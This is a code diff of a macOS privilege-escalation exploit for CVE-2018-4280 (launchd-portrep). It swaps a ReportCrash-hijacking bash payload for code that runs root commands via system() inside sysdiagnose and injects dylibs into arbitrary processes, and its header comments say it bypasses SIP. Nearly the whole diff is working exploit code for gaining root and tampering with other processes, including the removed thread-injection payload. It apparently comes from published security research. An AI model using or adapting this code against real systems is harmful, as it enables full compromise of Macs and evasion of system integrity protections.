@@ -2,6 +2,8 @@
  * launchd-portrep
  * Brandon Azad
  *
+ * CVE-2018-4280
+ *
  *
  * launchd-portrep
  * ================================================================================================
@@ -15,40 +17,35 @@
  *  See launchd-portrep.c.
  *
  *
- * Exploit strategy to get host-priv
+ * Exploit strategy to get task_for_pid-allow
  * ------------------------------------------------------------------------------------------------
  *
- *  See launchd-portrep-hostpriv.c.
+ *  See exploit.c.
  *
  *
- * Once we have host-priv
+ * Once we have task_for_pid-allow
  * ------------------------------------------------------------------------------------------------
  *
- *  Once we have the host-priv port, we can control any task on the system. Once again I use the
- *  same strategy as Ian Beer's original exploit: hijack a root process and make it execute our
- *  exploit payload. This exploit targets the ReportCrash process running as root. Using the task
- *  port, we can allocate memory in the task's address space, copy in an exploit payload, and then
- *  create a new thread in ReportCrash to run the payload.
+ *  Once we have code execution inside a task_for_pid-allow process, we can control any task on the
+ *  system. This is great because not only can we perform the standard elevation of privileges, but
+ *  we can also bypass SIP by injecting code into SIP-entitled processes.
  *
- *  The easiest payload to run is to force the hijacked process to exec /bin/bash to run a command
- *  string. The command string is arbitrary: it is supplied on the command line. For example, the
- *  accompanying launchd-portrep-rootsh.sh script creates a setuid root shell launcher under /var.
+ *  This exploit demonstrates two potential uses: system command execution as root and dylib
+ *  injection. To execute a system command, we simply invoke the standard system() function from
+ *  within sysdiagnose, passing it the command string supplied by the user. To inject a dylib into
+ *  a process, we call task_for_pid() from within sysdiagnose to get the task port of the target,
+ *  then use the task port to call dlopen() on the supplied library.
  *
  */
 
-#include "launchd-portrep.h"
-#include "launchd-portrep-hostpriv.h"
+#include "exploit.h"
 #include "log.h"
 
-#include <assert.h>
-#include <libproc.h>
+#include <dlfcn.h>
 #include <mach/mach.h>
-#include <mach/mach_vm.h>
 #include <stdio.h>
 #include <stdlib.h>
 #include <unistd.h>
-
-// ---- Logging -----------------------------------------------------------------------------------
 
 // A log function to print the message to stdout in classic hacker style.
 static void
@@ -64,217 +61,112 @@ log(char type, const char *format, va_list ap) {
 	free(msg);
 }
 
-// ---- Process functions -------------------------------------------------------------------------
-
-// Find all PIDs of processes matching the specified path.
+// Parse the program arguments.
 static bool
-proc_list_pids_with_path(const char *path, pid_t **pids, size_t *count) {
-	// Get the number of processes.
-	int capacity = proc_listallpids(NULL, 0);
-	if (capacity <= 0) {
-fail_0:
+parse_arguments(int argc, const char *argv[],
+		const char **system_command, pid_t *target_pid, const char **dylib_path) {
+	if (argc == 2) {
+		*system_command = argv[1];
+	} else if (argc == 3) {
+		char *end;
+		*target_pid = strtoul(argv[1], &end, 0);
+		if (*end != 0) {
+			goto usage;
+		}
+		*dylib_path = argv[2];
+	} else {
+usage:
+		printf("Usage: %1$s <command-string>\n"
+		       "  Executes \"system(<command-string>)\" from a root process\n"
+		       "Usage: %1$s <pid> <path-to-dylib>\n"
+		       "  Injects the dynamic library <path-to-dylib> into process <pid>\n",
+		       argv[0]);
 		return false;
 	}
-	capacity += 24;
-	assert(capacity > 0);
-	// Get the list of all PIDs.
-	pid_t all_pids[capacity];
-	int all_count = proc_listallpids(all_pids, capacity * sizeof(*all_pids));
-	if (all_count <= 0) {
-		goto fail_0;
-	}
-	// Filter down the list to only those matching the specified path.
-	size_t found = 0;
-	for (int i = 0; i < all_count; i++) {
-		pid_t pid = all_pids[i];
-		// Get this process's path.
-		char pid_path[MAXPATHLEN];
-		int len = proc_pidpath(pid, pid_path, sizeof(pid_path));
-		if (len <= 0) {
-			continue;
-		}
-		// If it's a match, add it to the list and increment the number of PIDs found.
-		if (strncmp(path, pid_path, len) == 0) {
-			all_pids[found] = pid;
-			found++;
-		}
-	}
-	// Now that we know how many match, allocate the buffer we'll return to the user.
-	pid_t *pids_array = malloc(found * sizeof(*pids));
-	if (pids_array == NULL) {
-		goto fail_0;
-	}
-	// We reverse the returned array because proc_listallpids seems to return the PIDs in
-	// reverse order.
-	for (int i = 0; i < found; i++) {
-		pids_array[i] = all_pids[found - (i + 1)];
-	}
-	*pids  = pids_array;
-	*count = found;
 	return true;
 }
 
-// ---- Exploit logic to take control of a root process -------------------------------------------
-
-// Get the task port for a process it should (hopefully) be safe for us to consume.
-static mach_port_t
-get_target_task(mach_port_t host_priv) {
-	const char *path = "/System/Library/CoreServices/ReportCrash";
-	const char *service = "com.apple.ReportCrash.DirectoryService";
-	// First try to jump-start the process.
-	bool started = launchd_start_service(service, true);
-	if (!started) {
-		ERROR("Could not start service %s", service);
-	}
-	// Sleep a little while to let it start up. I don't know why it isn't fully started by the
-	// time it replies to us in launchd_start_service.
-	usleep(400000);
-	// Now try to find the process's PID.
-	pid_t *pids;
-	size_t pid_count;
-	bool ok = proc_list_pids_with_path(path, &pids, &pid_count);
+// Run the specified command string inside sysdiagnose.
+static bool
+run_system_command(threadexec_t priv_tx, const char *system_command) {
+	int ret;
+	bool ok = threadexec_call_cv(priv_tx, &ret, sizeof(ret),
+			system, 1,
+			TX_CARG_CSTRING(const char *, system_command));
 	if (!ok) {
-		ERROR("Could not find PID for %s", path);
-		return MACH_PORT_NULL;
+		ERROR("Could not execute command in privileged process");
+		return false;
 	}
-	// Filter the list of PIDs until we find a process running as root.
-	bool found = false;
-	pid_t pid;
-	for (size_t i = 0; i < pid_count; i++) {
-		pid = pids[i];
-		struct proc_bsdshortinfo info;
-		int err = proc_pidinfo(pid, PROC_PIDT_SHORTBSDINFO, 0, &info, sizeof(info));
-		if (err <= 0) {
-			continue;
-		}
-		if (info.pbsi_uid == 0) {
-			found = true;
-			break;
-		}
-	}
-	free(pids);
-	// Fail if none of the processes are root.
-	if (!found) {
-		ERROR("Could not find process %s running as root", path);
-		return MACH_PORT_NULL;
-	}
-	// Get the task port.
-	INFO("Hijacking process %d", pid);
-	mach_port_t task = host_priv_task_for_pid(host_priv, pid);
-	if (task == MACH_PORT_NULL) {
-		ERROR("Could not get task for PID %d process %s", pid, path);
-	}
-	return task;
+	INFO("Command exited with status: %d", ret);
+	return true;
 }
 
-// Run our exploit payload in the target task. The exploit payload will attempt to copy 
+// Inject a dynamic library into the specified process.
 static bool
-run_payload(mach_port_t target_task, const char *bash_command) {
-	//
-	// We will execute:
-	//
-	//   char *argv[4] = { "/bin/bash", "-c", bash_command, NULL };
-	//   execve("/bin/bash", argv, NULL)
-	//
-	// Our payload looks like:
-	//
-	//                            /--------------------------\
-	//                   /--------|----------------------\   |
-	//   /---------------|--------|------------------\   |   |
-	//   v               v        v                  |   |   |
-	//   +===============+========+================+=|=+=|=+=|=+======+=========+
-	//   | "/bin/bash\0" | "-c\0" | <bash-command> | o | o | o | NULL |  stack  |
-	//   +===============+========+================+===+===+===+======+=========+
-	//   ^                                         ^                            ^
-	//   "/bin/bash"                               argv                 stack ptr
-	//
-	const char *const bash_path = "/bin/bash";
-	const char *const c_flag    = "-c";
-	const char *const argv[] = { bash_path, c_flag, bash_command };
-	const size_t argc = sizeof(argv) / sizeof(*argv);
-	const size_t stack_size = 0x1000;
-	// Get the size of the payload.
-	size_t payload_size = stack_size;
-	for (size_t i = 0; i < argc; i++) {
-		payload_size += strlen(argv[i]) + 1;
+inject_dylib(threadexec_t priv_tx, pid_t target_pid, const char *dylib_path) {
+	bool success = false;
+	// Get the task port of the specified process.
+	mach_port_t target_task;
+	bool ok = threadexec_task_for_pid(priv_tx, target_pid, &target_task);
+	if (!ok) {
+		ERROR("Could not get task port for PID %d", target_pid);
+		goto fail_0;
 	}
-	payload_size += (argc + 1) * sizeof(void *);
-	// Allocate our payload in the task.
-	mach_vm_address_t payload_address;
-	kern_return_t kr = mach_vm_allocate(target_task, &payload_address, payload_size,
-			VM_FLAGS_ANYWHERE);
-	if (kr != KERN_SUCCESS) {
-		ERROR("Could not allocate memory in target task: %x", kr);
-		return false;
+	INFO("Got task port 0x%x for PID %d", target_task, target_pid);
+	// Create an execution context in the target.
+	threadexec_t target_tx = threadexec_init(target_task, MACH_PORT_NULL, 0);
+	if (target_tx == NULL) {
+		ERROR("Could not create execution context in PID %d", target_pid);
+		mach_port_deallocate(mach_task_self(), target_task);
+		goto fail_0;
 	}
-	// Build a local version of the payload.
-	size_t initialized_payload_size = payload_size - stack_size;
-	uint8_t *payload = malloc(initialized_payload_size);
-	assert(payload != NULL);
-	char *str = (char *) payload;
-	uintptr_t payload_argv_element_address[argc];
-	for (size_t i = 0; i < argc; i++) {
-		payload_argv_element_address[i] = payload_address + ((uint8_t *) str - payload);
-		str = stpcpy(str, argv[i]) + 1;
+	DEBUG_TRACE(2, "Created execution context in PID %d", target_pid);
+	// Call dlopen(dylib_path, RTLD_NOW) in the target.
+	void *handle;
+	ok = threadexec_call_cv(target_tx, &handle, sizeof(handle),
+			dlopen, 2,
+			TX_CARG_CSTRING(const char *, dylib_path),
+			TX_CARG_LITERAL(int,          RTLD_NOW));
+	if (!ok) {
+		ERROR("Could not call dlopen(\"%s\") in process %d", dylib_path, target_pid);
+		goto fail_1;
 	}
-	const void **payload_argv = (const void **) str;
-	uintptr_t payload_argv_address = payload_address + ((uint8_t *) payload_argv - payload);
-	for (size_t i = 0; i < argc; i++) {
-		payload_argv[i] = (const void *)payload_argv_element_address[i];
+	if (handle == NULL) {
+		ERROR("Call dlopen(\"%s\") in process %d failed", dylib_path, target_pid);
+		goto fail_1;
 	}
-	payload_argv[argc] = NULL;
-	// Copy the local version of the payload to the remote task.
-	kr = mach_vm_write(target_task, payload_address, (mach_vm_address_t) payload,
-			initialized_payload_size);
-	free(payload);
-	if (kr != KERN_SUCCESS) {
-		mach_vm_deallocate(target_task, payload_address, payload_size);
-		ERROR("Could not copy payload into target task: %x", kr);
-		return false;
-	}
-	// Create a new thread to execute the payload.
-	x86_thread_state64_t state = {};
-	state.__rip = (uintptr_t) execve;
-	state.__rdi = payload_argv_element_address[0];
-	state.__rsi = payload_argv_address;
-	state.__rdx = (uintptr_t) NULL;
-	state.__rsp = payload_address + payload_size - 0x10;
-	mach_port_t exploit_thread;
-	kr = thread_create_running(target_task, x86_THREAD_STATE64, (thread_state_t) &state,
-			x86_THREAD_STATE64_COUNT, &exploit_thread);
-	if (kr != KERN_SUCCESS) {
-		ERROR("Could not create exploit thread in target task: %x", kr);
-		return false;
-	}
-	mach_port_deallocate(mach_task_self(), exploit_thread);
-	return true;
+	INFO("Successfully loaded \"%s\" in process %d", dylib_path, target_pid);
+	success = true;
+fail_1:
+	// Destroy the execution context in the target.
+	threadexec_deinit(target_tx);
+fail_0:
+	return success;
 }
 
 int
 main(int argc, const char *argv[]) {
-	if (argc != 2) {
-		printf("Usage: %s <bash-command-string>\n"
-		       "Executes \"bash -c '<bash-command-string>'\" in a root process\n",
-		       argv[0]);
-		return 1;
-	}
 	log_implementation = log;
-	// Run the exploit to get the host-priv port.
-	mach_port_t host_priv = launchd_portrep_host_priv();
-	if (host_priv == MACH_PORT_NULL) {
+	// Parse the arguments.
+	const char *system_command = NULL;
+	pid_t target_pid = -1;
+	const char *dylib_path = NULL;
+	bool success = parse_arguments(argc, argv, &system_command, &target_pid, &dylib_path);
+	if (!success) {
 		return 1;
 	}
-	// Try to get the task port for a process we can consume with a call to execve().
-	mach_port_t target_task = get_target_task(host_priv);
-	mach_port_deallocate(mach_task_self(), host_priv);
-	if (target_task == MACH_PORT_NULL) {
+	// Run the exploit to get an execution context in a privileged process.
+	threadexec_t priv_tx = exploit();
+	if (priv_tx == NULL) {
 		return 1;
 	}
-	// Run our payload in the target task.
-	bool ok = run_payload(target_task, argv[1]);
-	mach_port_deallocate(mach_task_self(), target_task);
-	if (!ok) {
-		return 1;
+	// Perform the requested action.
+	if (system_command != NULL) {
+		success = run_system_command(priv_tx, system_command);
+	} else if (dylib_path != NULL) {
+		success = inject_dylib(priv_tx, target_pid, dylib_path);
 	}
-	return 0;
+	// Deallocate the threadexec. This will also kill the process.
+	threadexec_deinit(priv_tx);
+	return (success ? 0 : 1);
 }
